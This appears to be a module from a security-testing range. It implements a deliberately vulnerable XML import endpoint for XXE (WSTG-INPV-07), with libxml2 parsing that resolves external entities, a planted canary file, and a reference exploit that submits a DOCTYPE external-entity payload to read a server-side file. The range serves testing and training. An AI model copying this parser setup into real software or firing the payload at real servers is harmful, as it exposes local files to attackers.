// WSTG-INPV-07 (4.7.7) — XML External Entity (XXE) behaviour.
// The ingest endpoint parses submitted XML with external entities enabled (real
// libxml2 via libxmljs2: noent + dtdload). A DOCTYPE declaring an external
// SYSTEM entity pointing at a local file is resolved and echoed back — so an
// attacker reads the server-side canary file. The file path is fixed and hinted
// in the GET docs so it is discoverable; the canary lives only in that file.

import fs from 'node:fs'
import path from 'node:path'
import libxmljsPkg from 'libxmljs2'
import { Scenario } from './scenario.mjs'

const libxmljs = libxmljsPkg.default || libxmljsPkg
const SECRET_PATH = process.env.POLYRANGE_XXE_SECRET_PATH || '/app/data/license.dat'

function canonicalXml(secretPath) {
  return `<?xml version="1.0"?>\n<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file://${secretPath}"> ]>\n<data><value>&xxe;</value></data>`
}

let secretWritten = false
function ensureSecretFile(canary) {
  if (secretWritten) return
  try {
    fs.mkdirSync(path.dirname(SECRET_PATH), { recursive: true })
    fs.writeFileSync(SECRET_PATH, canary)
    secretWritten = true
  } catch { /* best effort */ }
}

// VULNERABLE: parse with external entities resolved -> XXE.
export function parseRecord(xml) {
  const doc = libxmljs.parseXml(String(xml), { noent: true, dtdload: true, nonet: true })
  return doc.root() ? doc.root().text() : ''
}

function extractXml(req, rawBody) {
  const ct = String(req.headers['content-type'] || '')
  if (ct.includes('urlencoded')) {
    const v = new URLSearchParams(rawBody || '').get('xml')
    if (v != null) return v
  }
  return rawBody || ''
}

export const classDef = {
  wstgId: 'WSTG-INPV-07',
  class: 'XML External Entity (XXE)',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path
  },

  async handleRequest({ req, scenario, helpers, renderPage, manifest }) {
    ensureSecretFile(manifest.perDeployCanary)
    if (req.method !== 'POST') {
      return { status: 200, body: renderPage(docsPage(scenario)) }
    }
    const xml = extractXml(req, helpers.rawBody)
    if (!xml.trim()) {
      return { status: 400, body: renderPage(docsPage(scenario, 'No XML received.')) }
    }
    let parsed
    try {
      parsed = parseRecord(xml)
    } catch (e) {
      return { status: 400, body: renderPage(docsPage(scenario, 'Could not parse XML: ' + escapeHtml(String(e.message).slice(0, 160)))) }
    }
    return {
      status: 200,
      body: renderPage(`<section style="max-width:640px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 12px">Imported ${escapeHtml(scenario.recordNoun)} preview</h2>
  <pre style="background:#f3f3f3;padding:12px;border-radius:6px;white-space:pre-wrap">${escapeHtml(parsed)}</pre>
</section>`),
    }
  },

  // Reference exploit. Submits XML the validator passes in via `payload`; when
  // the validator hands us a tier-0 placeholder (a non-XML label) we fall back
  // to the canonical DOCTYPE external-entity document that resolves the
  // server-side canary file. Honouring the payload arg is what allows the T1
  // bypass list to actually iterate alternative XML shapes against the WAF.
  async fireExploit({ baseUrl, scenario, payload }) {
    const looksLikeXml = typeof payload === 'string' && /^\s*<\?xml|^\s*<!DOCTYPE/i.test(payload)
    const xml = looksLikeXml ? payload : canonicalXml(SECRET_PATH)
    const r = await fetch(`${baseUrl}${scenario.endpoint.path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/xml' },
      body: xml,
      redirect: 'manual',
    })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

// Exposed for the in-process self-test.
export const __test = { parseRecord, ensureSecretFile, SECRET_PATH }

function docsPage(scenario, err) {
  const sample = `&lt;?xml version="1.0"?&gt;\n&lt;record&gt;\n  &lt;value&gt;example&lt;/value&gt;\n&lt;/record&gt;`
  return `<section style="max-width:640px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">${escapeHtml(scenario.featureLabel)}</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.importIntro)}</p>
  ${err ? `<p role="alert" style="color:#b00;margin:0 0 12px">${escapeHtml(err)}</p>` : ''}
  <p style="font-size:13px;color:#666">POST your ${escapeHtml(scenario.recordNoun)} XML to <code>${scenario.endpoint.path}</code>; the parsed content is echoed below for preview. Submissions are validated against the server licence file at <code>${SECRET_PATH}</code>.</p>
  <pre style="background:#f3f3f3;padding:12px;border-radius:6px">${sample}</pre>
  <form method="POST" action="${scenario.endpoint.path}" style="margin-top:12px">
    <textarea name="xml" rows="6" style="width:100%;font-family:ui-monospace,monospace;padding:8px" placeholder="paste ${escapeHtml(scenario.recordNoun)} XML"></textarea>
    <button type="submit" style="margin-top:8px;padding:9px 14px">Preview import</button>
  </form>
</section>`
}
function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
